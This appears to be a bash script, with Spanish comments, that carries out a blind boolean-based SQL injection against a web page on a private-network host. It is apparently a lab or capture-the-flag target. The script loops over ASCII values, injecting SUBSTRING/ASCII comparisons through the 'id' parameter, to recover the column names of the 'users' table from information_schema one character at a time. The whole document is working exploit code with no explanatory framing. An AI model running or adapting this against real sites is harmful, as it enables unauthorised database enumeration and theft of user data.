#!/bin/bash

TARGET="http://172.20.10.12/?page=member"
TRUE_INDICATOR="First name: one"
TABLE_NAME_ENCODED="CHAR(117,115,101,114,115)"  # 'users'

MAX_COLUMNS=10
MAX_LENGTH=20

echo "Extrayendo nombres de columnas de la tabla 'users'..."

for ((col=0; col<MAX_COLUMNS; col++)); do
  nombre_col=""
  for ((pos=1; pos<=MAX_LENGTH; pos++)); do
    for ascii in {32..126}; do
      payload="1 AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=${TABLE_NAME_ENCODED} LIMIT ${col},1),${pos},1))=${ascii}"
      url_encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
      full_url="${TARGET}&id=${url_encoded}&Submit=Submit"

      resp=$(curl -s "$full_url")
      if echo "$resp" | grep -q "$TRUE_INDICATOR"; then
        char=$(printf \\$(printf '%03o' $ascii))
        nombre_col+=$char
        echo -ne "\r[+] Columna $col: $nombre_col"
        break
      fi
    done

    # Si no se encontró ningún carácter, asumimos fin del nombre
    if [ "$ascii" -eq 126 ]; then
      break
    fi
  done
  echo -e "\n--> Columna $col: $nombre_col"

  # Parar si la columna está vacía
  if [ -z "$nombre_col" ]; then
    break
  fi
done
